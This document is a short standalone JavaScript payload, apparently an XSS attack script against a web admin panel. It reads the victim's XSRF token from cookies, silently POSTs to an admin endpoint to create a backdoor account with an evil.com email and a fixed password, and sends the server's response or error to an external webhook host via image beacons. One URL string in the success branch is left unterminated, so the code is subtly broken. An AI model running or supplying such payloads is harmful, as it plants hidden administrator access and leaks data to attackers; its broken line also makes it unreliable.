(function(){
  var t=decodeURIComponent(document.cookie.match(/XSRF-TOKEN=([^;]+)/)[1]);
  fetch('/admin/security/users',{
    method:'POST',
    credentials:'include',
    headers:{
      'Content-Type':'application/json',
      'X-XSRF-TOKEN':t,
      'Accept':'application/json'
    },
    body:JSON.stringify({
      name:'support',
      email:'support@evil.com',
      password:'P@ssword1!',
      password_confirmation:'P@ssword1!',
      is_active:true
    })
  }).then(function(r){
    return r.text();
  }).then(function(d){
    new Image().src='https://webhooksite.net/586b992b-be17+encodeURIComponent(d);
  }).catch(function(e){
    new Image().src='https://webhooksite.net/586b992b-be17-4fee-beba-6190872e31b9/?err='+encodeURIComponent(e.message);
  });
})();
